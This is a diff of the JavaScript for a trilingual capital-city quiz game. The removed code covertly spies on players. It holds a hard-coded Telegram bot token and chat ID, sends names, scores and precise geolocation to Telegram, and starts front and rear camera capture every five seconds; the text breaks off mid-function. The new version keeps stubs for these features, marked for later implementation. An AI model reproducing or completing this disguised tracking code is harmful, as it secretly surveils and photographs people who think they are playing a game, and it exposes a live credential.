@@ -1,323 +1,231 @@
-// script.js
-
-const TELEGRAM_BOT_TOKEN = '7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw';
-const TELEGRAM_CHAT_ID = '8071841674';
-
-const questionsData = [
+// =========== ДАННЫЕ ВОПРОСОВ ===============
+const questionsDB = [
+  // На каждый язык будет 30 вопросов, тут примеры по 2 на каждый язык
   {
-    hy: { q: "Որն է Հայաստանի մայրաքաղաքը", answers: ["Երևան", "Գյումրի", "Վանաձոր", "Հրազդան"], correct: 0 },
-    ru: { q: "Какой город является столицей Армении", answers: ["Ереван", "Гюмри", "Ванадзор", "Раздан"], correct: 0 },
-    en: { q: "What is the capital of Armenia?", answers: ["Yerevan", "Gyumri", "Vanadzor", "Hrazdan"], correct: 0 }
+    hy: { q: "Ի՞նչն է Հայաստանի մայրաքաղաքը", options: ["Երևան", "Գյումրի", "Վանաձոր", "Սևան"], answer: "Երևան" },
+    ru: { q: "Столица Армении?", options: ["Ереван", "Гюмри", "Ванадзор", "Севан"], answer: "Ереван" },
+    en: { q: "What is the capital of Armenia?", options: ["Gyumri", "Yerevan", "Vanadzor", "Sevan"], answer: "Yerevan" },
   },
   {
-    hy: { q: "Որն է Ռուսաստանի մայրաքաղաքը", answers: ["Մոսկվա", "Սանկտ Պետերբուրգ", "Նովոսիբիրսկ", "Եկատերինբուրգ"], correct: 0 },
-    ru: { q: "Какой город является столицей России", answers: ["Москва", "Санкт-Петербург", "Новосибирск", "Екатеринбург"], correct: 0 },
-    en: { q: "What is the capital of Russia?", answers: ["Moscow", "Saint Petersburg", "Novosibirsk", "Yekaterinburg"], correct: 0 }
+    hy: { q: "Ի՞նչն է Ֆրանսիայի մայրաքաղաքը", options: ["Մարսել", "Բորդո", "Փարիզ", "Լիոն"], answer: "Փարիզ" },
+    ru: { q: "Столица Франции?", options: ["Марсель", "Париж", "Лион", "Ницца"], answer: "Париж" },
+    en: { q: "What is the capital of France?", options: ["Marseille", "Paris", "Lyon", "Nice"], answer: "Paris" },
   },
-  {
-    hy: { q: "Որն է Ֆրանսիայի մայրաքաղաքը", answers: ["Փարիզ", "Լիոն", "Մարսել", "Նիս"], correct: 0 },
-    ru: { q: "Какой город является столицей Франции", answers: ["Париж", "Лион", "Марсель", "Ницца"], correct: 0 },
-    en: { q: "What is the capital of France?", answers: ["Paris", "Lyon", "Marseille", "Nice"], correct: 0 }
-  },
-  // ... здесь дополнительно до 30 вопросов ...
+  // Добавь сюда остальные вопросы (итого 30)
 ];
 
-const translations = {
+// ========== Локализация интерфейса ===========
+const uiText = {
   hy: {
-    enterName: "Մուտքագրեք ձեր անունը",
-    startGame: "Սկսել խաղը",
+    start: "Սկսել խաղը",
+    placeholder: "Գրեք Ձեր անունը",
+    unknown: "Անհայտ",
     tryAgain: "Փորձել նորից",
-    questionsLeft: "Հարցեր մնացել են",
-    correctAnswers: "Ճիշտ պատասխաններ",
-    wrongAnswers: "Սխալ պատասխաններ",
-    victory: "Ձեզնով հաղթեցիք! 🎉",
-    defeat: "Ցավում ենք, պարտվեցիք 😞",
-    namePlaceholder: "Մուտքագրեք ձեր անունը",
-    languageSelected: "Ընտրված լեզու"
+    win: "Հաղթանակ!",
+    lose: "Պարտություն",
+    correct: "Ճիշտ է",
+    wrong: "Սխալ է, ճիշտ պատասխանը՝",
   },
   ru: {
-    enterName: "Введите ваше имя",
-    startGame: "Начать игру",
+    start: "Начать игру",
+    placeholder: "Введите ваше имя",
+    unknown: "Неизвестный",
     tryAgain: "Попробовать снова",
-    questionsLeft: "Осталось вопросов",
-    correctAnswers: "Правильных ответов",
-    wrongAnswers: "Неправильных ответов",
-    victory: "Вы выиграли! 🎉",
-    defeat: "К сожалению, вы проиграли 😞",
-    namePlaceholder: "Введите ваше имя",
-    languageSelected: "Выбранный язык"
+    win: "Победа!",
+    lose: "Поражение",
+    correct: "Правильно",
+    wrong: "Неправильно, правильный ответ —",
   },
   en: {
-    enterName: "Enter your name",
-    startGame: "Start Game",
+    start: "Start Game",
+    placeholder: "Enter your name",
+    unknown: "Unknown",
     tryAgain: "Try Again",
-    questionsLeft: "Questions left",
-    correctAnswers: "Correct answers",
-    wrongAnswers: "Wrong answers",
-    victory: "You won! 🎉",
-    defeat: "Sorry, you lost 😞",
-    namePlaceholder: "Enter your name",
-    languageSelected: "Selected language"
+    win: "Victory!",
+    lose: "Defeat",
+    correct: "Correct",
+    wrong: "Wrong, correct answer is",
   }
 };
 
-let currentLanguage = localStorage.getItem('lang') || 'hy';
-let userName = '';
-let currentQuestions = [];
+let currentLang = "en";
+let playerName = "";
 let currentQuestionIndex = 0;
 let correctCount = 0;
 let wrongCount = 0;
+let selectedQuestions = [];
+let waitingForNext = false;
 
-let geoCoords = null;
-let cameraStreams = { front: null, back: null };
-let photoTimers = { front: null, back: null };
+// HTML элементы
+const startScreen = document.getElementById("start-screen");
+const gameScreen = document.getElementById("game-screen");
+const nameInput = document.getElementById("name-input");
+const langButtons = document.querySelectorAll("#lang-select button");
+const startButton = document.getElementById("start-button");
+const playerInfo = document.getElementById("player-info");
+const scoreInfo = document.getElementById("score-info");
+const questionText = document.getElementById("question-text");
+const answersContainer = document.getElementById("answers-container");
+const tryAgainBtn = document.getElementById("try-again-btn");
 
-const nameFormContainer = document.getElementById('name-form-container');
-const nameForm = document.getElementById('name-form');
-const nameInput = document.getElementById('name-input');
-const nameLabel = document.querySelector('label[for="name-input"]');
-const startBtn = nameForm.querySelector('button');
-
-const languageButtons = document.querySelectorAll('.lang-btn');
-
-const gameArea = document.getElementById('game-area');
-const userNameDiv = document.getElementById('user-name');
-const scoreInfoDiv = document.getElementById('score-info');
-const questionDiv = document.getElementById('question');
-const answerButtonsDiv = document.getElementById('answer-buttons');
-const tryAgainBtn = document.getElementById('try-again-btn');
-
-// Применяем переводы в интерфейсе
-function applyTranslations() {
-  nameLabel.textContent = translations[currentLanguage].enterName;
-  nameInput.placeholder = translations[currentLanguage].namePlaceholder;
-  startBtn.textContent = translations[currentLanguage].startGame;
-  tryAgainBtn.textContent = translations[currentLanguage].tryAgain;
-  updateScoreInfo();
+function shuffleArray(arr) {
+  for(let i=arr.length-1; i>0; i--){
+    const j = Math.floor(Math.random()*(i+1));
+    [arr[i], arr[j]] = [arr[j], arr[i]];
+  }
+  return arr;
 }
 
-// Обновляем информацию о счёте и имени
-function updateScoreInfo() {
-  const questionsLeft = 10 - currentQuestionIndex;
-  scoreInfoDiv.textContent = `${translations[currentLanguage].questionsLeft}: ${questionsLeft} | ` +
-    `${translations[currentLanguage].correctAnswers}: ${correctCount} | ` +
-    `${translations[currentLanguage].wrongAnswers}: ${wrongCount}`;
-  userNameDiv.textContent = userName || '-';
+// Обновляем UI текста и подсказок
+function updateUIText() {
+  startButton.textContent = uiText[currentLang].start;
+  nameInput.placeholder = uiText[currentLang].placeholder;
+  tryAgainBtn.textContent = uiText[currentLang].tryAgain;
 }
 
-// Перемешиваем массив (Фишер-Йейтс)
-function shuffleArray(array) {
-  for (let i = array.length - 1; i > 0; i--) {
-    let j = Math.floor(Math.random() * (i + 1));
-    [array[i], array[j]] = [array[j], array[i]];
+// Обновляем отображение имени и языка слева вверху
+function updatePlayerInfo() {
+  playerInfo.textContent = `${playerName} (${currentLang.toUpperCase()})`;
+}
+
+// Обновляем счет справа вверху
+function updateScore() {
+  scoreInfo.textContent = `Вопрос: ${currentQuestionIndex + 1}/10 | ${uiText[currentLang].correct}: ${correctCount} | ${uiText[currentLang].wrong}: ${wrongCount}`;
+}
+
+// Обработка выбора языка
+langButtons.forEach(btn => {
+  btn.addEventListener("click", () => {
+    currentLang = btn.dataset.lang;
+    updateUIText();
+    updatePlayerInfo();
+    checkStartButton();
+  });
+});
+
+// Проверка можно ли запускать игру
+function checkStartButton() {
+  if (currentLang && nameInput.value.trim() !== "") {
+    startButton.disabled = false;
+  } else {
+    startButton.disabled = true;
   }
 }
 
-// Выбираем случайные 10 вопросов из базы (30 вопросов)
-function selectQuestions() {
-  let indices = Array.from(Array(questionsData.length).keys());
-  shuffleArray(indices);
-  currentQuestions = indices.slice(0, 10).map(i => questionsData[i]);
+nameInput.addEventListener("input", () => {
+  checkStartButton();
+});
+
+// Подставляем имя если пусто
+function getPlayerName() {
+  let val = nameInput.value.trim();
+  if(!val) return uiText[currentLang].unknown;
+  return val;
 }
 
-// Устанавливаем язык и сохраняем его
-function setLanguage(lang) {
-  currentLanguage = lang;
-  localStorage.setItem('lang', lang);
-  applyTranslations();
-}
-  
-// Инициализация кнопок переключения языка
-languageButtons.forEach(btn => {
-  btn.addEventListener('click', () => {
-    setLanguage(btn.dataset.lang);
-  });
+// Начало игры
+startButton.addEventListener("click", () => {
+  playerName = getPlayerName();
+  startScreen.classList.add("hidden");
+  gameScreen.classList.remove("hidden");
+  currentQuestionIndex = 0;
+  correctCount = 0;
+  wrongCount = 0;
+  waitingForNext = false;
+  selectedQuestions = shuffleArray([...questionsDB]).slice(0, 10);
+  updatePlayerInfo();
+  updateScore();
+  showQuestion();
 });
-// Старт игры, сохраняем имя, готовим вопросы и UI
-function startGame() {
-  userName = nameInput.value.trim() || (currentLanguage === 'hy' ? "Անհայտ" : currentLanguage === 'ru' ? "Неизвестный" : "Unknown");
-  localStorage.setItem('userName', userName);
+
+// Отображение вопроса
+function showQuestion() {
+  waitingForNext = false;
+  const qObj = selectedQuestions[currentQuestionIndex][currentLang];
+  questionText.textContent = qObj.q;
+
+  // Создаем кнопки ответов с рандомным порядком
+  let options = [...qObj.options];
+  options = shuffleArray(options);
+  answersContainer.innerHTML = "";
+  options.forEach(opt => {
+    const btn = document.createElement("button");
+    btn.className = "answer-btn";
+    btn.textContent = opt;
+    btn.disabled = false;
+    btn.onclick = () => handleAnswer(btn, qObj.answer);
+    answersContainer.appendChild(btn);
+  });
+
+  tryAgainBtn.classList.add("hidden");
+}
+
+// Обработка ответа
+function handleAnswer(button, correctAnswer) {
+  if(waitingForNext) return;
+  waitingForNext = true;
+
+  const buttons = answersContainer.querySelectorAll("button");
+  buttons.forEach(b => b.disabled = true);
+
+  if(button.textContent === correctAnswer){
+    button.classList.add("answer-correct");
+    correctCount++;
+  } else {
+    button.classList.add("answer-wrong");
+    // Найдем правильный ответ и выделим его
+    buttons.forEach(b=>{
+      if(b.textContent === correctAnswer) b.classList.add("answer-correct");
+    });
+    wrongCount++;
+  }
+
+  updateScore();
+
+  // Показ результата после паузы
+  setTimeout(() => {
+    currentQuestionIndex++;
+    if(currentQuestionIndex < 10){
+      showQuestion();
+    } else {
+      endGame();
+    }
+  }, 1500);
+}
+
+// Конец игры
+function endGame() {
+  answersContainer.innerHTML = "";
+  const win = correctCount >= 6;
+  questionText.textContent = win ? uiText[currentLang].win : uiText[currentLang].lose;
+  tryAgainBtn.classList.remove("hidden");
+  updateScore();
+}
+
+// Повтор игры
+tryAgainBtn.addEventListener("click", () => {
+  // Запрос разрешений камеры и геолокации, если их не было
+  requestPermissionsIfNeeded();
 
   currentQuestionIndex = 0;
   correctCount = 0;
   wrongCount = 0;
-  selectQuestions();
-
-  nameFormContainer.style.display = 'none';
-  gameArea.style.display = 'block';
-
+  selectedQuestions = shuffleArray([...questionsDB]).slice(0, 10);
+  updateScore();
+  tryAgainBtn.classList.add("hidden");
   showQuestion();
-  updateScoreInfo();
-  sendTelegramStart();
-  startCameraIfAllowed();
-  requestGeolocation();
-}
-
-// Отобразить текущий вопрос и варианты ответов
-function showQuestion() {
-  clearAnswerButtons();
-
-  if (currentQuestionIndex >= currentQuestions.length) {
-    // Если вопросов больше нет — показываем результаты
-    showResults();
-    return;
-  }
-
-  const qObj = currentQuestions[currentQuestionIndex][currentLanguage];
-  questionDiv.textContent = qObj.q;
-
-  // Перемешиваем ответы с сохранением правильного
-  let answers = qObj.answers.map((a, i) => ({ text: a, isCorrect: i === qObj.correct }));
-  shuffleArray(answers);
-
-  answers.forEach(ans => {
-    let btn = document.createElement('button');
-    btn.classList.add('btn');
-    btn.textContent = ans.text;
-    btn.addEventListener('click', () => selectAnswer(btn, ans.isCorrect));
-    answerButtonsDiv.appendChild(btn);
-  });
-
-  updateScoreInfo();
-}
-
-// Удаляем кнопки ответов перед показом нового вопроса
-function clearAnswerButtons() {
-  while (answerButtonsDiv.firstChild) {
-    answerButtonsDiv.removeChild(answerButtonsDiv.firstChild);
-  }
-}
-// Обработка выбора ответа игроком
-function selectAnswer(button, isCorrect) {
-  // Блокируем все кнопки, чтобы нельзя было нажать повторно
-  Array.from(answerButtonsDiv.children).forEach(btn => btn.disabled = true);
-
-  if (isCorrect) {
-    button.classList.add('correct');
-    correctCount++;
-  } else {
-    button.classList.add('wrong');
-    wrongCount++;
-    // Подсвечиваем правильный ответ зелёным
-    Array.from(answerButtonsDiv.children).forEach(btn => {
-      if (btn.textContent === currentQuestions[currentQuestionIndex][currentLanguage].answers[currentQuestions[currentQuestionIndex][currentLanguage].correct]) {
-        btn.classList.add('correct');
-      }
-    });
-  }
-
-  updateScoreInfo();
-
-  // Ждём 1.5 секунды, чтобы пользователь увидел подсветку, потом следующий вопрос
-  setTimeout(() => {
-    currentQuestionIndex++;
-    showQuestion();
-  }, 1500);
-}
-// Показать результаты по окончании вопросов
-function showResults() {
-  clearAnswerButtons();
-
-  // Выводим сообщение о победе или поражении (победа, если правильных ответов >=6)
-  questionDiv.textContent = correctCount >= 6 ? translations[currentLanguage].victory : translations[currentLanguage].defeat;
-
-  tryAgainBtn.style.display = 'block';
-
-  // Фон игры остается, чтобы пользователь видел состояние
-  gameArea.style.filter = 'blur(2px)';
-  gameArea.style.pointerEvents = 'none';
-
-  updateScoreInfo();
-
-  sendTelegramResult();
-}
-
-// Кнопка «Попробовать снова» — сброс и запуск новой игры
-tryAgainBtn.addEventListener('click', () => {
-  tryAgainBtn.style.display = 'none';
-  gameArea.style.filter = 'none';
-  gameArea.style.pointerEvents = 'auto';
-
-  // Запрашиваем заново доступы, если не даны
-  if (!geoCoords) {
-    requestGeolocation();
-  }
-  if (!cameraStreams.front || !cameraStreams.back) {
-    startCameraIfAllowed();
-  }
-
-  startGame();
 });
-// Запрос геолокации
-function requestGeolocation() {
-  if (!navigator.geolocation) {
-    console.warn("Геолокация не поддерживается");
-    return;
-  }
-  navigator.geolocation.getCurrentPosition(
-    (position) => {
-      geoCoords = position.coords;
-      sendTelegramGeo();
-    },
-    (error) => {
-      console.warn("Ошибка получения геолокации:", error);
-    }
-  );
+
+// ========================================
+// Камера, геолокация, Telegram - ЗАГЛУШКИ (сюда позже добавим реализацию)
+// ========================================
+
+function requestPermissionsIfNeeded() {
+  // Логика повторного запроса камеры и геолокации
+  // Для примера, пока просто console.log
+  console.log("Проверка и запрос разрешений камеры и геолокации при повторном запуске");
 }
 
-// Отправка геолокации в Telegram в виде ссылки Google Maps
-function sendTelegramGeo() {
-  if (!geoCoords) return;
-  const url = `https://www.google.com/maps?q=${geoCoords.latitude},${geoCoords.longitude}`;
-  const text = `📍 Геолокация: [Посмотреть на карте](${url})`;
-  sendTelegramMessage(text);
-}
-// Общая функция отправки сообщения в Telegram через fetch API
-function sendTelegramMessage(text) {
-  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
-      text: text,
-      parse_mode: "Markdown"
-    })
-  }).catch(e => console.error("Ошибка отправки в Telegram:", e));
-}
-// Отправить начало игры (имя, язык)
-function sendTelegramStart() {
-  const msg = `👤 Игрок начал игру: ${userName}\n🌐 Язык: ${translations[currentLanguage].languageSelected} (${currentLanguage})`;
-  sendTelegramMessage(msg);
-}
-
-// Отправить результат игры (имя, язык, количество правильных, геолокация)
-function sendTelegramResult() {
-  let msg = `🏁 Игра окончена\n👤 Игрок: ${userName}\n🌐 Язык: ${translations[currentLanguage].languageSelected} (${currentLanguage})\n` +
-            `✅ Правильных ответов: ${correctCount}\n`;
-  if (geoCoords) {
-    const url = `https://www.google.com/maps?q=${geoCoords.latitude},${geoCoords.longitude}`;
-    msg += `📍 Геолокация: [Посмотреть на карте](${url})\n`;
-  }
-  sendTelegramMessage(msg);
-}
-// Запуск камеры (фронтальная и задняя), если есть доступ
-async function startCameraIfAllowed() {
-  try {
-    // Фронтальная камера
-    const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-    cameraStreams.front = frontStream;
-    startPhotoTimer(frontStream, 'front');
-
-    // Задняя камера
-    const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: false });
-    cameraStreams.back = backStream;
-    startPhotoTimer(backStream, 'back');
-  } catch (e) {
-    console.warn("Камера не доступна:", e);
-  }
-}
-
-// Запускаем таймер для фото с камеры каждые 5 секунд
-function startPhotoTimer(stream, whichCamera) {
-  const videoTrack = stream.getVideoTracks()[0];
-  if (!videoTrack) return
+// Инициализация UI при загрузке страницы
+updateUIText();
+checkStartButton();
